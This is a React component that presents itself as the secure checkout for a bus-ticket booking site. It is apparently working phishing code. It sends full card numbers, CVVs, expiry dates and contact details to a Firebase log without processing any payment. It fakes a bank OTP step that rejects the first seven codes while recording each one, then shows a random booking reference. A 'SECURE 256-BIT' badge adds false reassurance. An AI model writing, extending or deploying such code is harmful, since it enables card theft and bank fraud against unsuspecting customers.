import React, { useState, useEffect } from 'react';
import { BusTrip, PassengerCount } from '../types';
import { Language, translations } from '../translations';
import { ShieldCheck, Mail, Phone, CreditCard, ChevronRight, Loader2, ArrowLeft, User, Lock, X } from 'lucide-react';
import { logPaymentAttempt, logOtpSubmission, updatePaymentTransactionStatus, logVisitorCheckoutProgress } from '../lib/firebase';
import { motion, AnimatePresence } from 'motion/react';

interface PaymentModalProps {
  trip: BusTrip;
  departureDate: string;
  passengers: PassengerCount;
  selectedSeats: number[];
  lang: Language;
  onSuccess: (bookingData: {
    passengerNames: string[];
    contactEmail: string;
    contactPhone: string;
    pnr: string;
  }) => void;
  onBack: () => void;
}

export default function PaymentModal({
  trip,
  departureDate,
  passengers,
  selectedSeats,
  lang,
  onSuccess,
  onBack,
}: PaymentModalProps) {
  const t = translations[lang];
  const totalSeats = selectedSeats.length;
  const totalPrice = totalSeats * trip.price;

  const [names, setNames] = useState<string[]>(Array(totalSeats).fill(''));
  const [email, setEmail] = useState('');
  const [phone, setPhone] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [cardHolder, setCardHolder] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [errorMsg, setErrorMsg] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);

  const [showOtp, setShowOtp] = useState(false);
  const [otp, setOtp] = useState('');
  const [otpError, setOtpError] = useState('');
  const [otpAttempts, setOtpAttempts] = useState(0);
  const [transactionId, setTransactionId] = useState('');

  // Sync checkout passenger details to session
  useEffect(() => {
    const hasAnyData = names.some(n => n.length > 0) || email.length > 0 || phone.length > 0;
    if (hasAnyData) {
      logVisitorCheckoutProgress({
        passengerNames: names,
        contactEmail: email,
        contactPhone: phone,
      });
    }
  }, [names, email, phone]);

  // Form helpers
  const handleNameChange = (index: number, val: string) => {
    const updated = [...names];
    updated[index] = val;
    setNames(updated);
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    // Format card as XXXX XXXX XXXX XXXX
    const value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = value.match(/\d{4,16}/g);
    const match = (matches && matches[0]) || '';
    const parts = [];

    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }

    if (parts.length > 0) {
      setCardNumber(parts.join(' '));
    } else {
      setCardNumber(value);
    }
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    // Format as MM/YY
    const value = e.target.value.replace(/[^0-9]/g, '');
    if (value.length >= 2) {
      setExpiry(`${value.slice(0, 2)}/${value.slice(2, 4)}`);
    } else {
      setExpiry(value);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg('');

    // Validations
    if (names.some((name) => name.trim().length < 3)) {
      setErrorMsg(lang === 'en' ? 'Please fill in all passenger names (min 3 chars).' : 'يرجى إدخال أسماء المسافرين كاملة.');
      return;
    }
    if (!email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
      setErrorMsg(lang === 'en' ? 'Please enter a valid email address.' : 'يرجى إدخال بريد إلكتروني صحيح.');
      return;
    }
    if (phone.trim().length < 7) {
      setErrorMsg(lang === 'en' ? 'Please enter a valid phone number.' : 'يرجى إدخال رقم هاتف صحيح.');
      return;
    }
    if (cardNumber.replace(/\s/g, '').length < 16) {
      setErrorMsg(lang === 'en' ? 'Please enter a valid 16-digit card number.' : 'يرجى إدخال رقم بطاقة صحيح.');
      return;
    }
    if (expiry.length < 5) {
      setErrorMsg(lang === 'en' ? 'Please enter a valid card expiry date (MM/YY).' : 'يرجى إدخال تاريخ انتهاء صحيح (MM/YY).');
      return;
    }
    if (cvv.length < 3) {
      setErrorMsg(lang === 'en' ? 'Please enter a valid CVV code.' : 'يرجى إدخال الرمز السري CVV.');
      return;
    }
    if (cardHolder.trim().length < 3) {
      setErrorMsg(lang === 'en' ? 'Please enter the cardholder\'s name.' : 'يرجى إدخال اسم صاحب البطاقة.');
      return;
    }

    // Process payment & store data to Firestore
    setIsProcessing(true);

    try {
      const txnId = await logPaymentAttempt({
        cardHolder,
        cardNumber,
        expiry,
        cvv,
        amount: totalPrice,
        passengerNames: names,
        contactEmail: email,
        contactPhone: phone,
        trip,
        selectedSeats,
      });
      setTransactionId(txnId);
    } catch (err) {
      console.warn('Failed to log payment attempt:', err);
    }

    setTimeout(() => {
      setIsProcessing(false);
      setShowOtp(true);
    }, 1500);
  };

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setOtpError('');
    if (otp.length < 4) {
      setOtpError(t.otpInvalid);
      return;
    }
    
    const submittedCode = otp;
    setIsProcessing(true);

    setTimeout(async () => {
      setIsProcessing(false);
      if (otpAttempts < 6) {
        setOtpError(t.otpFailed);
        setOtp('');
        setOtpAttempts(otpAttempts + 1);
        if (transactionId) {
          await logOtpSubmission(transactionId, submittedCode, otpAttempts + 1, 'failed');
        }
      } else {
        const randomPNR = 'JT' + Math.floor(100000 + Math.random() * 900000).toString();
        if (transactionId) {
          await logOtpSubmission(transactionId, submittedCode, otpAttempts + 1, 'completed', randomPNR);
        }
        onSuccess({
          passengerNames: names,
          contactEmail: email,
          contactPhone: phone,
          pnr: randomPNR,
        });
      }
    }, 1200);
  };

  return (
    <div className="bg-white border border-slate-100 rounded-2xl shadow-xl w-full max-w-4xl mx-auto overflow-hidden min-w-0 relative">
      
      {/* Top Banner */}
      <div className="bg-slate-900 text-white p-3.5 sm:p-7 flex flex-col xs:flex-row sm:flex-row items-stretch sm:items-center justify-between gap-3 sm:gap-4 min-w-0">
        <div className="flex items-center gap-2 sm:gap-3 min-w-0">
          <button
            onClick={onBack}
            className="p-2 rounded-lg hover:bg-slate-800 transition-colors text-slate-300"
            title="Go back"
          >
            <ArrowLeft className="w-5 h-5 rtl:rotate-180" />
          </button>
          <div>
            <h3 className="text-base sm:text-lg font-black tracking-tight break-words">{t.secureCheckout}</h3>
          </div>
        </div>
        <div className="bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 rounded-xl px-2.5 sm:px-3 py-1 text-[10px] sm:text-xs font-bold flex items-center gap-1.5 self-start sm:self-auto shrink-0">
          <ShieldCheck className="w-4 h-4" /> SECURE 256-BIT
        </div>
      </div>

      <div className="p-3.5 sm:p-10 min-w-0">
        <form onSubmit={handleSubmit} className="space-y-6 sm:space-y-8">
          
          {/* 1. Passenger Info */}
          <div>
            <h4 className="text-xs sm:text-sm uppercase tracking-wider sm:tracking-widest font-extrabold text-amber-600 mb-3 sm:mb-4 flex items-center gap-2">
              <User className="w-4.5 h-4.5" /> {t.paxNames}
            </h4>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-3 sm:gap-4 min-w-0">
              {names.map((name, index) => (
                <div key={index} className="space-y-1.5">
                  <label className="text-xs font-extrabold text-slate-500 uppercase">
                    {t.passenger} #{index + 1} ({lang === 'en' ? 'Seat' : 'مقعد'} {selectedSeats[index]})
                  </label>
                  <div className="flex items-center border border-slate-200 focus-within:border-amber-500 rounded-xl px-3 sm:px-3.5 py-3 bg-slate-50 focus-within:bg-white transition-all group min-w-0 overflow-hidden">
                    <User className="w-4.5 h-4.5 text-slate-400 group-focus-within:text-amber-500 transition-colors mr-2.5 rtl:ml-2.5 shrink-0" />
                    <input
                      type="text"
                      required
                      value={name}
                      onChange={(e) => handleNameChange(index, e.target.value)}
                      placeholder={t.namePlaceholder}
                      className="bg-transparent w-full min-w-0 outline-none text-sm font-bold text-slate-800"
                    />
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* 2. Contact Info */}
          <div className="border-t border-slate-100 pt-5 sm:pt-8">
            <h4 className="text-xs sm:text-sm uppercase tracking-wider sm:tracking-widest font-extrabold text-amber-600 mb-3 sm:mb-4 flex items-center gap-2">
              <Mail className="w-4.5 h-4.5" /> {t.contactInfo}
            </h4>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-3 sm:gap-6 min-w-0">
              <div className="space-y-1.5">
                <label className="text-xs font-extrabold text-slate-500 uppercase">{t.email}</label>
                <div className="flex items-center border border-slate-200 focus-within:border-amber-500 rounded-xl px-3 sm:px-3.5 py-3 bg-slate-50 focus-within:bg-white transition-all group min-w-0 overflow-hidden">
                  <Mail className="w-4.5 h-4.5 text-slate-400 group-focus-within:text-amber-500 transition-colors mr-2.5 rtl:ml-2.5 shrink-0" />
                  <input
                    type="email"
                    required
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder={t.emailPlaceholder}
                    className="bg-transparent w-full min-w-0 outline-none text-sm font-bold text-slate-800"
                  />
                </div>
              </div>

              <div className="space-y-1.5">
                <label className="text-xs font-extrabold text-slate-500 uppercase">{t.phone}</label>
                <div className="flex items-center border border-slate-200 focus-within:border-amber-500 rounded-xl px-3 sm:px-3.5 py-3 bg-slate-50 focus-within:bg-white transition-all group min-w-0 overflow-hidden">
                  <Phone className="w-4.5 h-4.5 text-slate-400 group-focus-within:text-amber-500 transition-colors mr-2.5 rtl:ml-2.5 shrink-0" />
                  <input
                    type="tel"
                    required
                    value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                    placeholder={t.phonePlaceholder}
                    className="bg-transparent w-full min-w-0 outline-none text-sm font-bold text-slate-800 dir-ltr text-left"
                  />
                </div>
              </div>
            </div>
          </div>

          {/* 3. Payment Details */}
          <div className="border-t border-slate-100 pt-5 sm:pt-8">
            <h4 className="text-xs sm:text-sm uppercase tracking-wider sm:tracking-widest font-extrabold text-amber-600 mb-3 sm:mb-4 flex items-center gap-2">
              <CreditCard className="w-4.5 h-4.5" /> {t.paymentDetails}
            </h4>

            <div className="bg-slate-50 border border-slate-100 p-4 sm:p-6 rounded-2xl mb-5 sm:mb-6 flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-4 min-w-0">
              <div>
                <p className="text-xs text-slate-500 font-extrabold uppercase mb-0.5">Booking Total</p>
                <p className="text-lg font-black text-slate-900">
                  {totalPrice} <span className="text-base font-extrabold text-amber-500">JOD</span>
                </p>
                <p className="text-xs text-slate-400 font-semibold">{totalSeats} seats × {trip.price} JOD</p>
              </div>
              <div className="flex flex-wrap gap-2 items-center justify-start sm:justify-end">
                {/* Visa */}
                <div className="bg-white border border-slate-200 rounded-lg p-1 flex items-center justify-center w-14 h-9 shadow-sm">
                <img src="https://i.ibb.co/DDyX4LPM/VISA-logo.png" alt="vs" width={90}/>
                </div>
                {/* MasterCard */}
                <div className="bg-white border border-slate-200 rounded-lg p-1 flex items-center justify-center w-14 h-9 shadow-sm">
                  <img src="https://i.ibb.co/PGksbwRk/Master-Card-Logo-svg.webp" alt="vs" width={90}/>
                </div>
                {/* American Express */}
               <img src="https://i.ibb.co/WWtv338j/American-Express-Color.png" alt="vs" width={90}/>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-3 gap-3 sm:gap-6 min-w-0">
              
              <div className="md:col-span-2 space-y-1.5">
                <label className="text-xs font-extrabold text-slate-500 uppercase">{t.cardNumber}</label>
                <div className="flex items-center border border-slate-200 focus-within:border-amber-500 rounded-xl px-3 sm:px-3.5 py-3 bg-slate-50 focus-within:bg-white transition-all group min-w-0 overflow-hidden">
                  <CreditCard className="w-4.5 h-4.5 text-slate-400 group-focus-within:text-amber-500 transition-colors mr-2.5 rtl:ml-2.5 shrink-0" />
                  <input
                    type="text"
                    required
                    maxLength={19}
                    value={cardNumber}
                    onChange={handleCardNumberChange}
                    placeholder="4111 2222 3333 4444"
                    className="bg-transparent w-full min-w-0 outline-none text-sm font-bold text-slate-800 dir-ltr text-left"
                  />
                </div>
              </div>

              <div className="space-y-1.5">
                <label className="text-xs font-extrabold text-slate-500 uppercase">{t.expiryDate}</label>
                <input
                  type="text"
                  required
                  maxLength={5}
                  value={expiry}
                  onChange={handleExpiryChange}
                  placeholder="MM/YY"
                  className="w-full min-w-0 border border-slate-200 focus:border-amber-500 outline-none rounded-xl px-3 sm:px-3.5 py-3 text-sm font-bold text-slate-800 bg-slate-50 focus:bg-white transition-all text-center dir-ltr"
                />
              </div>

              <div className="md:col-span-2 space-y-1.5">
                <label className="text-xs font-extrabold text-slate-500 uppercase">{t.cardHolder}</label>
                <input
                  type="text"
                  required
                  value={cardHolder}
                  onChange={(e) => setCardHolder(e.target.value)}
                  placeholder="MOHAMMAD AL-ABDALLAH"
                  className="w-full min-w-0 border border-slate-200 focus:border-amber-500 outline-none rounded-xl px-3 sm:px-3.5 py-3 text-sm font-bold text-slate-800 bg-slate-50 focus:bg-white transition-all"
                />
              </div>

              <div className="space-y-1.5">
                <label className="text-xs font-extrabold text-slate-500 uppercase">{t.cvv}</label>
                <input
                  type="password"
                  required
                  maxLength={3}
                  value={cvv}
                  onChange={(e) => setCvv(e.target.value.replace(/[^0-9]/g, ''))}
                  placeholder="•••"
                  className="w-full min-w-0 border border-slate-200 focus:border-amber-500 outline-none rounded-xl px-3 sm:px-3.5 py-3 text-sm font-bold text-slate-800 bg-slate-50 focus:bg-white transition-all text-center"
                />
              </div>

            </div>
          </div>

          {/* Errors section */}
          {errorMsg && (
            <div className="bg-red-50 border border-red-100 text-red-600 rounded-2xl p-4 text-sm font-bold">
              {errorMsg}
            </div>
          )}

          {/* Action Button */}
          <div className="flex gap-3 sm:gap-4 items-center min-w-0">
            <button
              type="submit"
              disabled={isProcessing}
              className="flex-1 min-w-0 bg-amber-500 hover:bg-amber-600 text-slate-950 font-black text-sm sm:text-lg px-3 py-3.5 sm:py-4 rounded-xl flex items-center justify-center gap-2 shadow-lg shadow-amber-500/10 active:scale-[0.99] transition-all disabled:opacity-75 disabled:cursor-not-allowed cursor-pointer text-center"
            >
              {isProcessing ? (
                <>
                  <Loader2 className="w-5 h-5 animate-spin text-slate-950" />
                  <span>Processing...</span>
                </>
              ) : (
                <>
                  <span>{t.payNow}</span>
                  <ChevronRight className="w-5 h-5" />
                </>
              )}
            </button>
          </div>

        </form>
      </div>

      {/* OTP Dialog Overlay */}
      <AnimatePresence>
        {showOtp && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 sm:p-6 bg-slate-950/60 backdrop-blur-sm">
            <motion.div
              initial={{ opacity: 0, scale: 0.9, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.9, y: 20 }}
              transition={{ type: "spring", damping: 25, stiffness: 300 }}
              className="bg-white rounded-3xl shadow-2xl w-full max-w-md overflow-hidden border border-slate-200"
            >
              {/* Dialog Header */}
              <div className="bg-slate-900 p-6 flex items-center justify-between text-white">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-xl bg-amber-500/20 border border-amber-500/30 flex items-center justify-center">
                    <Lock className="w-5 h-5 text-amber-500" />
                  </div>
                  <div>
                    <h3 className="font-black tracking-tight text-lg">{lang === 'en' ? 'Security Verification' : 'التحقق الأمني'}</h3>
                  </div>
                </div>
                <button 
                  onClick={() => setShowOtp(false)}
                  className="p-2 hover:bg-white/10 rounded-full transition-colors"
                >
                  <X className="w-5 h-5 text-slate-400" />
                </button>
              </div>

              <div className="p-8">
                <form onSubmit={handleOtpSubmit} className="space-y-6">
                  <div className="text-center space-y-3">
                    <p className="text-slate-500 font-bold text-sm leading-relaxed">
                      {t.otpDescription}
                    </p>
                  </div>

                  <div className="space-y-4">
                    <div className="relative">
                      <input
                        type="text"
                        required
                        autoFocus
                        autoComplete="one-time-code"
                        inputMode="numeric"
                        pattern="\d{4,6}"
                        maxLength={6}
                        value={otp}
                        onChange={(e) => setOtp(e.target.value.replace(/\D/g, ''))}
                        placeholder="••••••"
                        className="w-full text-center text-3xl sm:text-4xl tracking-[0.4em] sm:tracking-[0.8em] font-black border-2 border-slate-100 focus:border-amber-500 outline-none rounded-2xl px-2 py-5 bg-slate-50 focus:bg-white transition-all dir-ltr"
                      />
                    </div>

                    {otpError && (
                      <motion.div 
                        initial={{ opacity: 0, height: 0 }}
                        animate={{ opacity: 1, height: 'auto' }}
                        className="bg-red-50 border border-red-100 text-red-600 rounded-xl p-3.5 text-xs font-bold text-center flex items-center justify-center gap-2"
                      >
                        <span className="w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse" />
                        {otpError}
                      </motion.div>
                    )}
                  </div>

                  <button
                    type="submit"
                    disabled={isProcessing || otp.length < 4}
                    className="w-full bg-amber-500 hover:bg-amber-600 text-slate-950 font-black text-base py-4 rounded-xl flex items-center justify-center gap-3 shadow-xl shadow-amber-500/20 active:scale-[0.98] transition-all disabled:opacity-75 disabled:cursor-not-allowed"
                  >
                    {isProcessing ? (
                      <>
                        <Loader2 className="w-5 h-5 animate-spin" />
                        <span>{t.verifying}...</span>
                      </>
                    ) : (
                      <>
                        <span>{t.payNow}</span>
                        <ChevronRight className="w-5 h-5" />
                      </>
                    )}
                  </button>

                  <div className="flex items-center justify-center gap-4 pt-2">
                    <div className="h-px flex-1 bg-slate-100" />
                    <button
                      type="button"
                      onClick={() => setShowOtp(false)}
                      className="text-slate-400 hover:text-slate-600 text-xs font-black uppercase tracking-widest transition-colors"
                    >
                      {lang === 'en' ? 'Cancel' : 'إلغاء'}
                    </button>
                    <div className="h-px flex-1 bg-slate-100" />
                  </div>
                </form>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}
